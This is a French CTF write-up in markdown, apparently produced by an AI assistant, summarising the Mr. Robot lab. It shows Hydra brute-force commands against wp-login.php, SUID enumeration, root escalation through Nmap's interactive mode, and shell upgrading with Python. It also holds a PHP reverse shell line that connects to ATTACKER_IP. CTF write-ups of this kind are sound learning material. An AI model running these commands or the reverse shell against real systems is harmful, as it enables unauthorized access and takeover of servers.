@@ -1,0 +1,201 @@
+### **Résumé détaillé : Ce que j'ai appris et mes nouvelles compétences**
+
+---
+
+#### **1. Bruteforce avancé avec Hydra**
+##### **Contexte et approche :**
+- Lors de l’attaque, j’ai découvert une faille dans la gestion des erreurs sur la page de connexion WordPress (`wp-login.php`). Cette faille verbose permettait de distinguer :
+  - Si le nom d’utilisateur (username) est incorrect.
+  - Si le mot de passe (password) est incorrect.
+
+##### **Pourquoi est-ce important ?**
+- Cette faille permet d'optimiser le bruteforce en se concentrant sur un élément à la fois (d'abord le username, puis le password).
+
+##### **Commandes utilisées :**
+- **Pour bruteforcer un username** (avec une liste de noms) :
+  ```bash
+  hydra -L usernames.txt -p testpassword <IP_TARGET> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
+  ```
+  - `-L usernames.txt` : Liste des usernames testés.
+  - `-p testpassword` : Mot de passe fixe utilisé pour tester chaque username.
+
+- **Pour bruteforcer un password** (après identification du username correct) :
+  ```bash
+  hydra -l Elliot -P fsocity.dic <IP_TARGET> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid password"
+  ```
+  - `-l Elliot` : Nom d’utilisateur identifié.
+  - `-P fsocity.dic` : Wordlist contenant les mots de passe testés.
+
+##### **Ce que j’ai appris :**
+- L'importance d'analyser les réponses d'une application web pour exploiter les failles verbose.
+- La puissance d’Hydra pour personnaliser les attaques en fonction des messages d’erreur spécifiques d’un site.
+
+---
+
+#### **2. Escalade des privilèges sur Linux**
+##### **Contexte et approche :**
+- Une fois connecté en tant qu’utilisateur non privilégié (`robot`), j’ai recherché des moyens d’escalader mes privilèges pour devenir `root`.
+
+##### **Identification des fichiers SUID :**
+- Les fichiers avec le **bit SUID** permettent d’exécuter des commandes avec les droits de leur propriétaire (souvent root). J’ai utilisé la commande suivante pour les lister :
+  ```bash
+  find / -perm -u=s -type f 2>/dev/null
+  ```
+- Résultats obtenus :
+  - Parmi les fichiers listés, j’ai identifié **Nmap** comme exploitable.
+
+##### **Exploitation de Nmap :**
+- La version de Nmap présente sur la cible (3.81) permet un **mode interactif** vulnérable. Ce mode permet d’exécuter des commandes système.
+- J’ai lancé Nmap en mode interactif :
+  ```bash
+  nmap --interactive
+  ```
+- Une fois dans l’interface interactive, j’ai exécuté un shell avec les privilèges root :
+  ```bash
+  !sh
+  ```
+- **Vérification :**
+  ```bash
+  whoami
+  ```
+  Résultat : `root`
+
+##### **Ce que j’ai appris :**
+- Le concept du **bit SUID** et son exploitation.
+- Comment analyser les binaires vulnérables et utiliser des outils comme Nmap pour escalader mes privilèges.
+
+---
+
+#### **3. Passage d’un reverse shell à un shell interactif**
+##### **Contexte :**
+- Après avoir injecté un reverse shell via WordPress, j’ai obtenu un accès initial limité en tant qu’utilisateur `robot`.
+
+##### **Problème rencontré :**
+- Un reverse shell basique ne permet pas d’exécuter certaines commandes interactives comme `nano` ou `sudo`. Cela limite les actions possibles.
+
+##### **Solution :**
+- J’ai utilisé Python pour convertir le shell en **shell interactif** :
+  ```bash
+  python -c 'import pty; pty.spawn("/bin/bash")'
+  ```
+- **Actions supplémentaires pour améliorer l’expérience :**
+  - Ajuster le terminal local :
+    ```bash
+    stty raw -echo
+    ```
+  - Exporter les variables nécessaires pour le shell interactif :
+    ```bash
+    export TERM=xterm
+    ```
+
+##### **Ce que j’ai appris :**
+- Pourquoi un shell interactif est important (gestion des signaux, compatibilité des commandes).
+- Comment utiliser Python pour simuler un terminal complet.
+
+---
+
+### **Code pour GitHub**
+
+Voici un exemple de script automatisé que je pourrais publier sur **GitHub**. Ce script documente les étapes principales et inclut des commandes réutilisables.
+
+---
+
+#### **Fichier : `mr_robot_exploit.md`**
+```markdown
+# Exploitation du CTF Mr. Robot
+
+## Étapes principales
+
+### 1. Reconnaissance de la cible
+1. **Ping de la cible** :
+   ```bash
+   ping <IP_TARGET>
+   ```
+
+2. **Scan des ports avec Nmap** :
+   ```bash
+   nmap -sV <IP_TARGET>
+   ```
+
+3. **Recherche de répertoires avec Gobuster** :
+   ```bash
+   gobuster dir -u http://<IP_TARGET> -w <wordlist>
+   ```
+
+---
+
+### 2. Exploitation de WordPress
+1. **Scan WordPress avec WPScan** :
+   ```bash
+   wpscan --url http://<IP_TARGET> --enumerate vp
+   ```
+
+2. **Bruteforce avec Hydra** :
+   - **Bruteforce du username** :
+     ```bash
+     hydra -L usernames.txt -p testpassword <IP_TARGET> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
+     ```
+   - **Bruteforce du mot de passe** :
+     ```bash
+     hydra -l Elliot -P fsocity.dic <IP_TARGET> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid password"
+     ```
+
+3. **Injection d’un reverse shell PHP dans un plugin WordPress** :
+   ```php
+   <?php
+   exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");
+   ?>
+   ```
+
+---
+
+### 3. Escalade des privilèges sur Linux
+1. **Rechercher les fichiers SUID** :
+   ```bash
+   find / -perm -u=s -type f 2>/dev/null
+   ```
+
+2. **Exploitation de Nmap** :
+   - Lancer le mode interactif :
+     ```bash
+     nmap --interactive
+     ```
+   - Exécuter un shell root :
+     ```bash
+     !sh
+     ```
+
+---
+
+### 4. Passage d’un reverse shell à un shell interactif
+1. **Améliorer le shell avec Python** :
+   ```bash
+   python -c 'import pty; pty.spawn("/bin/bash")'
+   ```
+2. **Ajuster le terminal local** :
+   ```bash
+   stty raw -echo
+   export TERM=xterm
+   ```
+
+---
+
+## Résumé global des compétences acquises
+Bruteforce avancé avec Hydra :
+
+Adapter la syntaxe en fonction des réponses du site.
+Exploiter des failles pour optimiser les attaques.
+Escalade des privilèges sous Linux :
+
+Identifier les fichiers SUID et comprendre leur rôle.
+Exploiter des programmes vulnérables pour devenir root.
+Amélioration d'un shell :
+
+Passer d’un reverse shell basique à un shell interactif.
+Comprendre les limitations des shells non interactifs.
+
+```
+
+---
+
+Ce fichier peut être directement ajouté à un dépôt GitHub pour documenter l'approche suivie. Besoin d'une aide pour mettre cela en ligne ou ajouter d'autres sections ? 😊
